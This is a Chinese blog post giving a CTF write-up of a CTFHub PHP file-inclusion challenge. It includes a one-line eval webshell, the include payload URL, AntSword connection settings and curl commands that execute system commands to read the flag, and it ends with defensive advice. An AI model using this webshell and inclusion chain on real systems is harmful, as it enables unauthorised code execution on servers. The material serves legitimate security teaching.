---
title: "CTFHub 文件包含实战：利用一句话木马 getshell"
date: 2026-06-05T23:10:00+08:00
draft: false
tags: ["CTF", "Web安全", "文件包含", "PHP", "一句话木马", "蚁剑", "CTFHub"]
categories: ["WriteUp"]
---

## 一、题目信息

- **平台**：CTFHub
- **分类**：Skill / Web / RCE / 文件包含
- **考点**：PHP `include` 函数、一句话木马、WebShell 连接

题目链接：[https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html](https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html)

---

## 二、源码分析

进入题目后，直接给出了 PHP 源码：

```php
<?php
error_reporting(0);  // 关闭报错显示

if (isset($_GET['file'])) {                    // 接收 file 参数
    if (strpos($_GET['file'], "flag") !== false) {  // 如果包含 "flag" 字符串
        echo "hack";                           // 输出 hack，阻止访问
    } else {
        include($_GET['file']);                // 否则包含指定文件
    }
}
?>
```

### 逻辑梳理

| 条件 | 结果 |
|------|------|
| `file` 参数包含 `"flag"` | 输出 `hack`，包含失败 |
| `file` 参数不含 `"flag"` | 执行 `include($file)` |

**核心考点**：`include()` 函数的特性——**不检查后缀，直接执行文件中的 PHP 代码**。

---

## 三、发现突破口

题目下方有一个提示链接，访问后得到 `shell.txt`：

```
http://<TARGET_IP>:<PORT>/shell.txt
```

内容是一句话木马：

```php
<?php eval($_REQUEST['ctfhub']);?>
```

- **连接密码**：`ctfhub`
- **原理**：`eval()` 函数将 `$_REQUEST['ctfhub']` 接收到的内容作为 PHP 代码执行

---

## 四、解题思路

### 4.1 include 函数的关键特性

假设 `index.php` 中执行了：

```php
include('shell.txt');
```

不管 `shell.txt` 的后缀名是什么（`.txt`、`.jpg`、`.log` 都可以），**文件中的内容都会被当作 PHP 代码执行**。

也就是说，`shell.txt` 里的 `<?php eval($_REQUEST['ctfhub']);?>` 会在 `index.php` 的上下文中运行，相当于 `index.php` 自身具备了 eval 的能力。

### 4.2 构造 Payload

利用 `file` 参数包含 `shell.txt`：

```
http://<TARGET_IP>:<PORT>/?file=shell.txt
```

此时页面已经「感染」了一句话木马。接下来只需要向该 URL 发送 `ctfhub` 参数即可执行任意 PHP 代码。

---

## 五、蚁剑连接

### 5.1 添加 Shell

打开蚁剑，右键「添加数据」：

| 字段 | 值 |
|------|-----|
| URL | `http://<TARGET_IP>:<PORT>/?file=shell.txt` |
| 连接密码 | `ctfhub` |
| 编码器 | `default` |

### 5.2 获取 Flag

连接成功后，在蚁剑终端执行：

```bash
cat /flag
```

即可拿到 flag。

---

## 六、不用蚁剑？curl 一样可以打

蚁剑的本质就是帮你发送 HTTP 请求。手动用 curl 完全等价：

### 步骤 1：先包含木马
```bash
curl "http://challenge-xxx.sandbox.ctfhub.com:10080/?file=shell.txt"
```

### 步骤 2：执行命令
```bash
# 查看当前目录
curl -X POST "http://challenge-xxx/?file=shell.txt" \
  -d "ctfhub=system('ls');"

# 读取 flag
curl -X POST "http://challenge-xxx/?file=shell.txt" \
  -d "ctfhub=system('cat /flag');"
```

### 步骤 3：如果用 GET 方式
```bash
curl "http://challenge-xxx/?file=shell.txt&ctfhub=system('cat /flag');"
```

---

## 七、考点总结

| 知识点 | 核心内容 |
|--------|----------|
| `include()` / `require()` | **不检查后缀**，被包含文件的内容直接在当前 PHP 上下文中执行 |
| 一句话木马 | `<?php eval($_REQUEST['x']);?>` 是最经典的 WebShell 形式 |
| 伪协议绕过 | 如果无法上传文件，可用 `php://input`、`data://` 等伪协议直接注入代码 |
| 黑名单绕过 | 题目过滤了 `"flag"` 字符串，但没有过滤 `shell.txt`，属于**黑名单不完整** |

---

## 八、防御建议

1. **白名单校验**：只允许包含指定目录下的特定文件
   ```php
   $allowed = ['header.php', 'footer.php'];
   if (!in_array($_GET['file'], $allowed)) {
       die('Invalid file');
   }
   ```

2. **关闭危险协议**
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

3. **使用 `open_basedir`** 限制 PHP 可访问的目录范围

4. **WAF 拦截**：对 `file` 参数中的 `../`、`php://`、`data://` 等关键字进行过滤

---

## 九、结语

这道题虽然简单，但涵盖了文件包含漏洞最经典的利用链条：

**发现 include 漏洞 → 找到可包含的恶意文件 → 利用 include 特性执行 WebShell → getshell → 读 flag**

在实际渗透测试中，很多 CMS 和框架的历史漏洞都是这个套路的变体。理解 `include()` 函数「不检查后缀直接执行」这一特性，是掌握文件包含漏洞的关键。

> 参考来源：[CTFHub 文件包含 WriteUp](https://writeup.ctfhub.com/Skill/Web/RCE/5LdE3KFwGi6nxRDrvdB8AY.html)（原创投稿：Jazz）
